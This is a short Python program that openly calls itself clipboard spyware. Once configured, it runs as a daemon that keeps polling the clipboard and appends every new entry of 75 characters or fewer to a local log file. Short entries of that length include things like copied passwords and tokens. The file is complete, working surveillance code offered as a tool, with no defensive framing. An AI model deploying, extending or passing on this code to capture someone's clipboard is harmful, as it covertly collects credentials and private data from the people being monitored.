#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""" This package implement a SpyWare to capture the clipboard. """

###################
#    This package implement a SpyWare to capture the clipboard.
#    Copyright (C) 2021  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

__all__ = ["Daemon", "main", "config_load"]

from configparser import ConfigParser
from os import path, environ
from pyperclip import paste
from time import sleep
from enum import Enum
from sys import argv


def config_load() -> None:

    """ This function load the config file. """

    global Constantes

    CONFIG = ConfigParser()
    env_conf_file = environ.get("clipboardSpy.conf")

    if len(argv) == 2:
        CONFIG.read(argv[1])
    elif env_conf_file:
        CONFIG.read(env_conf_file)
    else:
        CONFIG.read(path.join(path.dirname(__file__), "clipboardSpy.conf"))


    class Constantes(Enum):

        save_filename: str = CONFIG["SAVE"]["filename"]
        timeBetweenPaste: float = CONFIG.getfloat("TIME", "clipboardSleep")


class Daemon:

    """ This class implement a loop to get clipboard for ever. """

    def __init__(self):
        self.time = Constantes.timeBetweenPaste.value
        self.path =  Constantes.save_filename.value
        self.run = True

    def run_for_ever(self) -> None:

        """ This function get clipboard and sleep for ever. """

        if not path.isfile(self.path):
            file = open(self.path, 'w')
            file.write("")
            file.close()

        while self.run:
            self.clipboard = paste()
            if len(self.clipboard) > 75:
                self.clipboard = ""
            else:
                self.save()

            if self.run:
                sleep(self.time)

    def save(self) -> None:

        """ This function save clipboard if isn't save before. """

        with open(self.path) as file:
            data = file.read()

        if self.clipboard not in data:
            with open(self.path, "a") as file:
                file.write(self.clipboard + "\n")


def main() -> None:
    config_load()

    daemon = Daemon()
    try:
        daemon.run_for_ever()
    except KeyboardInterrupt:
        daemon.run = False


if __name__ == "__main__":
    main()
